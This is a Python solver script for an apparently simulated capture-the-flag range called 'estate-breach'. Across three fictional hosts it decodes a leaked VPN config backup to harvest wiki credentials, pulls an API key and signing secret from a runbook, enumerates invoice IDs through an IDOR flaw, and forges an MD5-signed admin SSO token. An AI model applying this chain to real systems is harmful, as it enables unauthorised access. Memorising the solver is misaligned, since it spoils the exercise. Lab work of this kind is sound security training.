"""Intended-path solver: walk three simulated hosts, forge the token, assemble the flag."""

import base64
import hashlib
import re
from typing import Any

import httpx
from openrange.content.solver import SolveResult, TaskResult, find_flags

TASK_ID = "estate-breach"


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    detail = None
    edge_host = "vpn-edge.minimcorp.net"
    wiki_host = "wiki.corp.minimcorp.net"
    fin_host = "finance.minimcorp.net"

    # host 1: vpn-edge, stale rollback config leak
    home = httpx.get(base, headers={"Host": edge_host}, timeout=10).text
    match = re.search(r"(/static/vpn\.conf\.bak)", home)
    frag_edge = None
    wiki_creds: tuple[str, str] | None = None
    if not match and detail is None:
        detail = "vpn-edge homepage leaked no rollback config path"
    if match:
        raw = httpx.get(base + match.group(1), headers={"Host": edge_host}, timeout=10).content
        plain = base64.b64decode(raw).decode(errors="replace")
        m_frag = re.search(r"fragment\[vpn-edge\.minimcorp\.net\]=([A-Z2-7]{4})", plain)
        m_user = re.search(r"wiki_user=(\S+)", plain)
        m_pass = re.search(r"wiki_pass=(\S+)", plain)
        if m_frag and m_user and m_pass:
            frag_edge = m_frag.group(1)
            wiki_creds = (m_user.group(1), m_pass.group(1))
        elif detail is None:
            detail = f"decoded vpn config lacked expected fields: {plain[:200]}"

    # host 2: wiki, authenticated recon plus revision metadata
    frag_wiki = None
    runbook: Any = {}
    if not wiki_creds and detail is None:
        detail = "no wiki credentials recovered from the vpn config"
    else:
        auth = tuple(wiki_creds or ("", ""))
        body = httpx.get(
            base + "/pages/finance-runbook",
            headers={"Host": wiki_host},
            auth=auth,
            timeout=10,
        ).json()
        if isinstance(body, dict) and "body" in body:
            runbook = body
            revs = httpx.get(
                base + "/pages/finance-runbook/revisions",
                headers={"Host": wiki_host},
                auth=auth,
                timeout=10,
            ).json()
            for rev in revs.get("revisions", []):
                found = re.search(
                    r"fragment\[wiki\.corp\.minimcorp\.net\]=([A-Z2-7]{4})",
                    str(rev.get("comment", "")),
                )
                if found:
                    frag_wiki = found.group(1)
                    break
        elif detail is None:
            detail = f"finance-runbook page unreadable: {body}"

    api_key = (
        str(re.search(r"(fin-api-key-\d+)", str(runbook.get("body", ""))).group(1))
        if runbook
        else ""
    )
    secret = ""
    if runbook:
        m_secret = re.search(r"legacy signing secret is (\S+?),", str(runbook.get("body", "")))
        secret = m_secret.group(1) if m_secret else ""
    elif detail is None:
        detail = "runbook content missing"

    # host 3: finance, IDOR enumeration then directory-sim forgery
    frag_fin = None
    if not api_key or not secret:
        if detail is None:
            detail = "runbook did not yield the api key and signing secret"
    else:
        headers = {"Host": fin_host, "X-API-Key": api_key}
        frag_fin = None
        exec_note = ""
        employee_id = 1001
        while employee_id <= 1099:
            reply = httpx.get(base + f"/api/invoices/{employee_id}", headers=headers, timeout=10)
            if reply.status_code == 200:
                record = reply.json()
                note = str(record.get("note", ""))
                found = re.search(r"fragment\[finance\.minimcorp\.net\]=([A-Z2-7]{4})", note)
                if found:
                    frag_fin = found.group(1)
                    exec_note = note
                    break
            employee_id += 1
        if not frag_fin and detail is None:
            detail = "no executive record with a fragment across enumerated ids"
        if frag_fin:
            m_admin = re.search(r"principal (\w+\.\w+)", exec_note)
            target_user = m_admin.group(1) if m_admin else ""
            material = f"{target_user}|estate-admin|{secret}"
            sig = hashlib.md5(material.encode()).hexdigest()
            granted = httpx.post(
                base + "/sso/verify",
                headers={"Host": fin_host},
                json={"user": target_user, "role": "estate-admin", "sig": sig},
                timeout=10,
            )
            token = str(granted.json().get("token", "")) if granted.status_code == 200 else ""

            captured_flag = None
            if not token:
                if detail is None:
                    detail = "directory-sim refused the forged signature"
            else:
                fragments = {
                    edge_host: frag_edge,
                    wiki_host: frag_wiki,
                    fin_host: frag_fin,
                }
                missing_hosts = sorted(h for h, v in fragments.items() if not v)
                if missing_hosts:
                    if detail is None:
                        detail = f"fragments missing for {missing_hosts}"
                else:
                    reply = httpx.post(
                        base + "/scoreboard",
                        json={"fragments": fragments, "token": token},
                        timeout=10,
                    ).json()
                    flags = find_flags(reply.get("flag") or "")
                    if reply.get("status") == "unlocked" and flags:
                        captured_flag = flags[0]
                    elif detail is None:
                        detail = f"scoreboard refused complete set: {reply}"
            return SolveResult(
                results=[
                    TaskResult(
                        task_id=TASK_ID,
                        ok=captured_flag is not None,
                        captured=captured_flag,
                        detail=detail,
                    )
                ]
            )

    return SolveResult(
        results=[TaskResult(task_id=TASK_ID, ok=False, captured=None, detail=detail)]
    )
